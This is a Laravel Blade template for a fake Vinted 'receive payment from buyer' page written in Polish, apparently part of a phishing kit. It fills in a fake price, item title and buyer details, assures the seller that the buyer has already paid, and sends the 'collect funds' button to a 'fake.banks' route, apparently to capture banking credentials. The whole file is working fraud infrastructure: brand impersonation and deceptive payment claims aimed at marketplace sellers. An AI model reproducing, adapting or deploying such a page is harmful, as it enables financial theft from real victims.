@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/inpost.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div class="app app--simple_layout" id="app">
        <div class="base">
            <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer"
                 data-tiny="1">
                <header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv">
                    <div class="sc-eIHaNI grYHP"></div>
                    <div class="sc-eTpRJs hnEmwS">
                        <div class="sc-iomxrj fZtIUm" style="background-color: #ffffff">
                            <section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE">
                                <div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd">
                                    <div class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk">
                                        <img src="{{asset('images/vinted_logo.png')}}"
                                             style="width: 100px;height: 46px;" alt="">
                                        <div class="sc-eXNvrr iBzLWS"></div>
                                    </div>
                                </div>
                            </section>
                            <div class="sc-dxZgTM RFfMX"></div>
                        </div>
                    </div>
                </header>
            </div>

            <aside class="nav_container sidebar_container">
                <nav class="_container" data-container="CategoryMobileContainer"></nav>
            </aside>

            <div class="bundle">
                <div class="container _container" data-container="PaymentsContainer">
                    <div class="payments_container" id="payments">
                        <div>
                            <h1 class="title__1tzAN2wR" id="ch7"> Odbiór płatności od kupującego</h1>
                            <div class="container__28A_2L3T">
                                <div>
                                    <div class="product__2oLb4nXl">
                     <span class="product_image__2AcYUpNV">
                     <img src="{{asset('images/track_image.png')}}" id="pr_image" width="100" height="100"
                          alt=""></span>
                                        <div class="product_content__mI30-3Fr">
                                            <div class="product_inner__1ZrDwagy">
                                                <div class="product_price__2IFwtrXu">
                                                    <span class="product_real_price__j_Bk3J3i">
                                                        <span>
                                                            <span id="pr_price">Deklarowana cena: <b>{{$fake->price()}}</b></span>
                                                        </span>
                                                    </span>
                                                </div>
                                                <div class="product_title__3jNOq_vZ" id="pr_name">Zadeklarowana nazwa
                                                    przedmiotu: <b>{{$fake->title}}</b></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="container__b66PCR7o">
                                        <div class="summary__2TIRymkY">
                                            <div class="summary_header__bJmC15X9">
                                                <div class="summary_price__1HT5R9_P">
                                                    <span>
                                                        <span id="last">Deklarowana cena: <b>{{$fake->price()}}</b></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="fixed_buttons fixed_buttons--single" style="z-index: 1;">
                                                <div class="summary_total__3aEKbkJu">
                                                    Całkowity
                                                    <div class="summary_total_value__nRhP7XkA"><span><span
                                                                    id="pr_price"><b>Deklarowana cena: </b>{{$fake->price()}}</span></span>
                                                    </div>
                                                </div>
                                                <div class="button_container">
                                                    <a href="{{subRoute('fake.banks')}}"
                                                       id="good"
                                                       style="background: #ffcd00;color: black; border-radius: 20px 20px 20px 20px;"
                                                       class="sc-dVhcbM ccONKs">
                                                    <span class="sc-fBuWsC hvBxNu"><b
                                                                id="ch1">ODBIERZ ŚRODKI</b></span>
                                                    </a>
                                                </div>
                                            </div>
                                            <div class="safely_text__392qqBrF">
                                                <div style="background-image: url(data:image/png;base64,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);"
                                                     class="status_badge__icon status_badge__icon--deal"></div>
                                                <span id="ch6">Otrzymanie płatności jest bezpieczne </span>
                                            </div>
                                            <div class="hint" id="hint">Klikając przycisk „<b>ODBIERZ ŚRODKI</b>” ,
                                                akceptujesz warunki Umowy użytkownika, korzystając z usługi online
                                                „Bezpieczna oferta”
                                            </div>
                                        </div>
                                        <div class="block__3ioUhNQH">
                                            <div class="panel__3B1d-ak5">
                                                <div class="panel_icon__1HmxOezY" style="display: inline-flex;">
                                                    <div style="background-image: url(/images/safe.png);"
                                                         class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                                                </div>
                                                <div class="panel_button__2vr4fIVO"></div>
                                                <div class="panel_content__VGeorc1g">
                                                    <div class="text__3Wt10VPX">
                                                        <b id="ch8">Twój przedmiot został zakupiony!</b>
                                                    </div>
                                                    <div class="hint__aMasvQSz" id="ch9">Kupujący już zapłacił za
                                                        zamówienie.
                                                    </div>
                                                </div>
                                                <div class="panel_button__2vr4fIVO"></div>
                                            </div>

                                            <div class="form__1P2Y3sX1">
                                                <form>

                                                    <label class="label__332nHo7g" style="font-weight: 700;" id="ch2">Dane do wysyłki</label>

                                                    <div>
                                                        <label class="label__332nHo7g">Adres dostawy</label>
                                                        <div class="row rows">
                                                            <div class="col-md-8">
                                                                <div class="root__3ahLIWiH">
                                                                    <div class="from_group form_group__3-PlZQuP">
                                                                        <input type="text"
                                                                               class="form_control form_control__3Uyg-pWq"
                                                                               placeholder="Kod pocztowy, miasto, ulica, dom"
                                                                               id="0" disabled=""
                                                                               value="{{$fake->address}}"></div>
                                                                </div>
                                                            </div>

                                                        </div>
                                                    </div>

                                                    <div class="row" style="position: relative;">
                                                        <div class="col-md-4">
                                                            <label class="label__332nHo7g">Nazwisko</label>
                                                            <div class="from_group form_group__3-PlZQuP"><input
                                                                        name="lastname" type="text" id="2"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        placeholder="Nazwisko" maxlength="25"
                                                                        disabled=""
                                                                        value="{{$fake->fullName()['fname']}}"></div>
                                                        </div>
                                                        <div class="col-md-4">
                                                            <label class="label__332nHo7g">Imię</label>
                                                            <div class="from_group form_group__3-PlZQuP"><input
                                                                        name="firstname" type="text" id="3"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        placeholder="Imię" maxlength="25" disabled=""
                                                                        value="{{$fake->fullName()['lname']}}"></div>
                                                        </div>
                                                    </div>
                                                    <p class="hint__2r7xW549" style="margin-top:15px" id="ch11">Po
                                                        zaksięgowaniu środków prosimy o nadanie przedmiotu
                                                        kupującemu
                                                        zgodnie z podanymi danymi lub przekazanie przedmiotu przez
                                                        kuriera,który będzie dzwonił w ciągu 12 godzin</p>
                                                    <p class="hint__2r7xW549" id="ch15">
                                                        Po wysłaniu przedmiotu prosimy o nadanie kupującemu numeru paczki!</p>

                                                </form>
                                            </div>

                                            <div id="ch12" class="hint payhint__1EGeMlob">Klikając przycisk „<b>ODBIERZ
                                                    ŚRODKI</b>” , akceptujesz warunki Umowy użytkownika, korzystając z
                                                usługi online „Bezpieczna oferta”
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="overlay">
            <div class="loader hide"></div>
        </div>
        <div class="global">
            <div></div>
        </div>
    </div>
@endsection